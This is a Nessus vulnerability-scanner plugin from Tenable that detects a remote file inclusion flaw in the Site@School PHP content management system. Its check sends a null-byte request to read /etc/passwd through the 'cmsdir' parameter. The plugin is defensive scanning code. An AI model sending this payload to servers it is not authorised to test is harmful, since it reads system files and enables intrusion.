#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(22368);
  script_version("1.18");
  script_set_attribute(attribute:"plugin_modification_date", value:"2022/04/11");

  script_cve_id("CVE-2006-4920", "CVE-2006-4921");
  script_bugtraq_id(20053);
  script_xref(name:"EDB-ID", value:"2374");

  script_name(english:"Site@School Multiple Script cmsdir Parameter Remote File Inclusion");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to multiple remote file inclusion attacks.");
  script_set_attribute(attribute:"description", value:
"The remote host is running Site@School, an open source, PHP-based,
content management system intended for primary schools. 

The version of Site@School installed on the remote host fails to
sanitize input to the 'cmsdir' parameter before using it to include
PHP code in several scripts.  Provided PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to exploit
this issue to view arbitrary files on the remote host or to execute
arbitrary PHP code, possibly taken from third-party hosts.");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Site@School version 2.4.03 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");

  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2006/09/15");
  script_set_attribute(attribute:"plugin_publication_date", value:"2006/09/16");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:siteatschool:siteatschool");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2022 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("http_version.nasl");
  script_require_keys("www/PHP");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("data_protection.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
foreach dir (cgi_dirs())
{
  if (thorough_tests) 
    files = make_list(
      "/starnet/modules/sn_allbum/slideshow.php",
      "/starnet/modules/include/include.php",
      "/starnet/themes/editable/main.inc.php"
    );
  else files = make_list("/starnet/modules/sn_allbum/slideshow.php");

  foreach file (files)
  {
    # Try to exploit the flaw to read a file.
    local_file = "/etc/passwd";
    w = http_send_recv3(method:"GET",
      item:string(
        dir, file, "?",
        "cmsdir=", local_file, "%00"
      ),
      port:port
    );
    if (isnull(w)) exit(1, "The web server did not answer");
    res = w[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or...
      string("main(", file, "\\0/languages/EN/sn_allbum/EN.php): failed to open stream") >< res ||
      string("main(", file, "\\0/languages/EN/include/EN.php): failed to open stream") >< res ||
      string("main(", file, "\\0/themes//): failed to open stream") >< res ||
      # we get an error claiming the file doesn't exist or...
      string("main(", file, "): failed to open stream: No such file") >< res ||
      # we get an error about open_basedir restriction.
      string("open_basedir restriction in effect. File(", file) >< res
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (contents && report_verbosity)
      {
        contents = data_protection::redact_etc_passwd(output:contents);
        report = string(
          "Here are the contents of the file '", local_file, "' that Nessus was\n",
          "able to read from the remote host :\n",
          "\n",
          contents
        );
      }
      else report = NULL;

      security_hole(port:port, extra:report);
      exit(0);
    }
  }
}
